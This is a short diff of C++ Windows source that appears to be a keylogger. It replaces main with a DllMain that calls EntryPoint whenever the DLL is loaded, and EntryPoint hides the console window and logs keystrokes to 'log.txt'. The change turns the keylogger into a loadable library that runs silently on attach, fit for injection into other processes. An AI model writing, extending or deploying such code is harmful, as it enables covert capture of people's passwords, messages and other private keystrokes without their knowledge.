@@ -4,10 +4,20 @@
 #include <codecvt>
 #include <stdlib.h>
 #include <string>
+int EntryPoint();
 void log(std::string c, std::string fileName);
 std::string getKey(unsigned char c);
 
-int main(){
+BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    switch (dwReason) {
+        case DLL_PROCESS_ATTACH:
+            EntryPoint();
+            break;
+    }
+    return TRUE;
+}
+
+int EntryPoint(){
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     std::string logFileName = "log.txt";
     unsigned char keyboardState[256] = {0};
@@ -40,6 +50,8 @@ int main(){
     }
     return 0;
 }
+
+
 void log(std::string c, std::string fileName){
     
     std::fstream logFile;
@@ -51,6 +63,7 @@ void log(std::string c, std::string fileName){
     }
     
 }
+
 
 std::string getKey(unsigned char c){
     
